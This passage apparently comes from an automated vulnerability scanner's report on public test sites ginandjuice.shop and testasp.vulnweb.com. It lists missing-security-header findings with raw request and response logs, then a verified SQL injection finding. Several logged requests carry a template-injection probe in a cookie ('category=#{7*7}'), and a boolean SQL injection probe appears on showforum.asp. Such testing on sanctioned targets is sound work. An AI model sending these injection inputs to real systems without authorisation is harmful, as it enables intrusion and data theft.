    ... [62 more lines, 4000 chars total]
  elapsed_ms: 827.6
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/blog/post as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F24] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/resources/js/subscribeNow.js (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-cfdcd91d (exactly as issued by the engine) ---
  GET /resources/js/subscribeNow.js
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: public, max-age=3600
    connection: keep-alive
    content-length: 3739
    content-type: application/javascript; charset=utf-8
    date: Sat, 03 Oct 2026 01:07:31 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:07:31 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    let subscribeNowReady = (callback) => {
        if (document.readyState !== "loading") callback();
        else document.addEventListener("DOMContentLoaded", callback);
    }
    
    subscribeNowReady(() => {
        const subscribeNowForm = document.querySelector("#subscribe");
        const buttonInput = subscribeNowForm.querySelector("button[type=submit]");
        const emailInput = subscribeNowForm.querySelector("input[type=email]");
    
        buttonInput.addEventListener("click", (event) => {
            event.preventDefault();
    ... [80 more lines, 3739 chars total]
  elapsed_ms: 821.1
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/resources/js/subscribeNow.js as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F25] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/resources/footer/js/scanme.js (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-e0da4184 (exactly as issued by the engine) ---
  GET /resources/footer/js/scanme.js
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: public, max-age=3600
    connection: keep-alive
    content-length: 6307
    content-type: application/javascript; charset=utf-8
    date: Sat, 03 Oct 2026 01:07:32 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:07:32 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    let navTrigger = document.querySelector(".nav-trigger");
    let body = document.querySelector("body");
    let navTarget = document.querySelector("nav");
    
    let ready = (callback) => {
        if (document.readyState !== "loading") callback();
        else document.addEventListener("DOMContentLoaded", callback);
    }
    
    ready(() => {
        const isHomePage = document.querySelector("[theme='home']");
        const isCartPage= document.querySelector("[theme='cart']");
    ... [85 more lines, 3998 chars total]
  elapsed_ms: 828.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/resources/footer/js/scanme.js as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F26] missing_security_headers — low (engine verdict: verified)

- Surface: POST https://ginandjuice.shop/catalog/subscribe (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-d48bb00d (exactly as issued by the engine) ---
  POST /catalog/subscribe
  headers:
    Content-Type: application/json
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    {"email": "", "csrf": "cLMwyt9kNcW3xZojBgHnlTavl5BeUZr4"}
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 37
    content-type: application/json; charset=utf-8
    date: Sat, 03 Oct 2026 01:07:33 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:07:33 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    {"coupon":"9In&JUICE5H0P","email":""}
  elapsed_ms: 828.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send POST https://ginandjuice.shop/catalog/subscribe as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F27] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/resources/css/labsEcommerce.css (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-e02d90e6 (exactly as issued by the engine) ---
  GET /resources/css/labsEcommerce.css
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: public, max-age=3600
    connection: keep-alive
    content-length: 28217
    content-type: text/css
    date: Sat, 03 Oct 2026 01:08:25 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:08:25 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    :root {
      --spacingbase: 0.9em;
    }
    
    @media (min-width: 992px) {
      :root {
        --spacingbase: 1em;
      }
    }
    @media (min-width: 1200px) {
      :root {
        --spacingbase: 1.1em;
    ... [185 more lines, 4000 chars total]
  elapsed_ms: 1027.4
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/resources/css/labsEcommerce.css as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F28] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/resources/css/labsBlog.css (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-cdfd99e3 (exactly as issued by the engine) ---
  GET /resources/css/labsBlog.css
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=#{7*7}; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: public, max-age=3600
    connection: keep-alive
    content-length: 23903
    content-type: text/css
    date: Sat, 03 Oct 2026 01:09:30 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:09:30 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    :root {
      --spacingbase: 0.9em;
    }
    
    @media (min-width: 992px) {
      :root {
        --spacingbase: 1em;
      }
    }
    @media (min-width: 1200px) {
      :root {
        --spacingbase: 1.1em;
    ... [185 more lines, 4000 chars total]
  elapsed_ms: 1023.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/resources/css/labsBlog.css as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F29] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/resources/js/deparam.js (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-e918c325 (exactly as issued by the engine) ---
  GET /resources/js/deparam.js
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=#{7*7}; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: public, max-age=3600
    connection: keep-alive
    content-length: 2128
    content-type: application/javascript; charset=utf-8
    date: Sat, 03 Oct 2026 01:09:31 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:09:31 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    var deparam = function( params, coerce ) {
        var obj = {},
            coerce_types = { 'true': !0, 'false': !1, 'null': null };
    
        if (!params) {
            return obj;
        }
    
        params.replace(/\+/g, ' ').split('&').forEach(function(v){
            var param = v.split( '=' ),
                key = decodeURIComponent( param[0] ),
                val,
    ... [52 more lines, 2127 chars total]
  elapsed_ms: 825.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/resources/js/deparam.js as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F30] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/resources/js/searchLogger.js (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-11ec5a3d (exactly as issued by the engine) ---
  GET /resources/js/searchLogger.js
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=#{7*7}; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: public, max-age=3600
    connection: keep-alive
    content-length: 657
    content-type: application/javascript; charset=utf-8
    date: Sat, 03 Oct 2026 01:09:31 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:09:31 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    async function logQuery(url, params) {
        try {
            await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
        } catch(e) {
            console.error("Failed storing query");
        }
    }
    
    async function searchLogger() {
        let config = {params: deparam(new URL(location).searchParams.toString())};
    
        if(config.transport_url) {
    ... [11 more lines, 657 chars total]
  elapsed_ms: 819.3
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/resources/js/searchLogger.js as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F31] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/blog/ (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-b3ccd638 (exactly as issued by the engine) ---
  GET /blog/?search=1&back=%2Fblog%2F
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=#{7*7}; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 8681
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:09:32 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:09:32 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsBlog.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Gin &amp; Juice Shop</title>
    ... [61 more lines, 4000 chars total]
  elapsed_ms: 824.4
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/blog/ as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F32] missing_security_headers — low (engine verdict: verified)

- Surface: POST https://ginandjuice.shop/login (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-e75aa244 (exactly as issued by the engine) ---
  POST /login
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=#{7*7}; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    csrf=01Tf5dByi38I3jPV9Xtg28ieSij5LPFd&username=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 400
  headers:
    connection: keep-alive
    content-length: 19
    content-type: application/json; charset=utf-8
    date: Sat, 03 Oct 2026 01:10:19 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:10:19 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    "Missing parameter"
  elapsed_ms: 826.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send POST https://ginandjuice.shop/login as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F33] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/resources/js/xmlStockCheckPayload.js (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-3fa96b82 (exactly as issued by the engine) ---
  GET /resources/js/xmlStockCheckPayload.js
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=#{7*7}; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: public, max-age=3600
    connection: keep-alive
    content-length: 356
    content-type: application/javascript; charset=utf-8
    date: Sat, 03 Oct 2026 01:11:10 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:11:10 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    window.contentType = 'application/xml';
    
    function payload(data) {
        var xml = '<?xml version="1.0" encoding="UTF-8"?>';
        xml += '<stockCheck>';
    
        for(var pair of data.entries()) {
            var key = pair[0];
            var value = pair[1];
    
            xml += '<' + key + '>' + value + '</' + key + '>';
        }
    ... [4 more lines, 356 chars total]
  elapsed_ms: 822.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/resources/js/xmlStockCheckPayload.js as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F34] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/resources/js/stockCheck.js (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-3626cbd3 (exactly as issued by the engine) ---
  GET /resources/js/stockCheck.js
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=#{7*7}; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: public, max-age=3600
    connection: keep-alive
    content-length: 824
    content-type: application/javascript; charset=utf-8
    date: Sat, 03 Oct 2026 01:11:11 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:11:11 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    document.getElementById("stockCheckForm").addEventListener("submit", function(e) {
        checkStock(this.getAttribute("method"), this.getAttribute("action"), new FormData(this));
        e.preventDefault();
    });
    
    function checkStock(method, path, data) {
        const retry = (tries) => tries == 0
            ? null
            : fetch(
                path,
                {
                    method,
    ... [13 more lines, 824 chars total]
  elapsed_ms: 827.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/resources/js/stockCheck.js as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F35] missing_security_headers — low (engine verdict: verified)

- Surface: POST https://ginandjuice.shop/catalog/product/stock (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-506c4bb1 (exactly as issued by the engine) ---
  POST /catalog/product/stock
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=#{7*7}; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    productId=1&storeId=1
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 400
  headers:
    connection: keep-alive
    content-length: 19
    content-type: application/json; charset=utf-8
    date: Sat, 03 Oct 2026 01:11:12 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:11:12 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    "XML parsing error"
  elapsed_ms: 821.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send POST https://ginandjuice.shop/catalog/product/stock as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F36] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/resources/images/tracker.gif (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-0a2a6759 (exactly as issued by the engine) ---
  GET /resources/images/tracker.gif?searchTerms=
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=#{7*7}; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: public, max-age=3600
    connection: keep-alive
    content-length: 42
    content-type: image/gif
    date: Sat, 03 Oct 2026 01:14:18 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:14:18 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    GIF89a\x01\x00\x01\x00�\x00\x00\x00\x00\x00���!�\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x01D\x00;
  elapsed_ms: 825.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/resources/images/tracker.gif as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

---

# TARGET: http://testasp.vulnweb.com  (testasp)

Authorization basis: Acunetix public test site (vulnweb.com) — explicitly provided for security testing.

Scan record (as-run, unedited):
- run_id: run-e2a9fe4450 | seed: cb51ac55 | scanner: sentinel-core/4.2.1
- profile: see the raw scan JSON at build-v421/results/live_v421/testasp.json
- requests: 609 | duration: 446.67s | rate_limit: {"limited": 0, "retries": 0, "recovered": 0}
- journal: 609 entries | dropped: 0
- OAST: {"channel": "public-webhook", "interactions": 0}
- engine verdict tally (as-is): 34 findings / 3 rejected / 0 unverified


## [TESTASP F01] sql_injection — critical (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/showforum.asp (parameter: `id`)
- Engine verdict: verified via `oracle:replay-2round` | confidence 0.95 | rounds 2
- Verification notes (engine-recorded): replay TRUE=200 FALSE=500
- Impact (engine-assessed): proven — Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was demonstrated, not exercised.
- Evidence chain (engine-recorded):
    * [response_diff] TRUE probe -> HTTP 200 (2965B), FALSE probe -> HTTP 500 (1208B) — boolean oracle
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-ae0b70e0 (exactly as issued by the engine) ---
  GET /showforum.asp?id=2+AND+1%3D1
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 2965
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:24 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum Miscellaneous</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [38 more lines, 3114 chars total]
  elapsed_ms: 366.6
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/showforum.asp with the tested parameter 'id' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (response_diff)

## [TESTASP F02] sql_injection — critical (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Search.asp (parameter: `tfSearch`)
- Engine verdict: verified via `error:replay-2variants` | confidence 0.9 | rounds 2
